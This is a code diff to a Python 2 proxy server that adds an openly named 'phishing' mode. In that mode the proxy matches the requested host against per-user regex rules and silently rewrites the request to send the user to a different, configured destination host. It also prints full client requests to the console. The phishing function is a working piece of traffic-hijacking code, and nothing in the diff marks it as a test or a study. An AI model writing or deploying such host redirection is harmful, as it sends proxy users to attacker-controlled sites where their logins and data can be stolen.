@@ -76,13 +76,16 @@ class ProxyServer:
                     elif users['mode'] == 0:
                         self.mode = 0
                         self.rules = users['forbid']
-                    else:
+                    elif users['mode'] == 2:
                         self.mode = 2
+                        self.rules = users['phishing']
+                    else:
+                        self.mode = 3
                         self.rules = None
                     return True
         return False
 
-    def filter(self,request):
+    def filter(self):
         print 'FILTER:','[ALLOW]' if self.mode==1 else '[FORBID]',self.rules,self.targetHost
         for item in self.rules:
             if self.mode == 0:
@@ -102,6 +105,17 @@ class ProxyServer:
         if self.mode == 1:
             return True
 
+    def phishing(self,request):
+        for item in self.rules:
+            if re.findall(item['src'],self.targetHost):
+                print 'PHISHING:',self.targetHost,'=>',item['dst']
+                self.request = request.replace(self.targetHost.split('/')[2],item['dst'])
+                self.targetHost = self.targetHost.replace(self.targetHost.split('/')[2],item['dst'])
+                print self.request
+                return True
+        return False
+
+
     def run(self):
     	res =  self.auth()
         if not res:
@@ -112,10 +126,13 @@ class ProxyServer:
         	self.client.send('success')
 
         request=self.getClientRequest()
+        print request
         if request:
-            if self.mode == 1:
-                if self.filter(request):
+            if self.mode == 1 or self.mode == 0:
+                if self.filter():
                     return
+            if self.mode == 2:
+                self.phishing(request)
             if self.method in ['GET','POST','PUT','DELETE','HAVE']:
                 self.commonMethod(request)
             elif self.method=='CONNECT':
